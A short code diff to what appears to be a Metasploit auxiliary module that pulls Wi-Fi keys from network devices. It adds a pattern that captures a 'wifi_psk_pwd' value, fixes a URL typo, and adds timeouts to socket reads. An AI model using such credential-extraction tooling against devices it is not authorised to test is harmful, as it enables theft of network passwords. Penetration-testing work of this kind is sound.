@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -28,7 +28,8 @@ class Metasploit3 < Msf::Auxiliary
       ['Wifi Key 1', /wifi_key1=(\S+)/i],
       ['Wifi Key 2', /wifi_key2=(\S+)/i],
       ['Wifi Key 3', /wifi_key3=(\S+)/i],
-      ['Wifi Key 4', /wifi_key4=(\S+)/i]
+      ['Wifi Key 4', /wifi_key4=(\S+)/i],
+      ['Wifi PSK PWD', /wifi_psk_pwd=(\S+)/i]
     ]
   }
 
@@ -115,7 +116,7 @@ class Metasploit3 < Msf::Auxiliary
     begin
       connect
       sock.put(Rex::Text.rand_text(5))
-      res = sock.get_once
+      res = sock.get_once(-1, 10)
       disconnect
     rescue Rex::ConnectionError => e
       print_error("Connection failed: #{e.class}: #{e}")
@@ -146,7 +147,7 @@ class Metasploit3 < Msf::Auxiliary
 
     connect
     sock.put(pkt)
-    res = sock.get
+    res = sock.get_once(-1, 10)
 
     disconnect
 
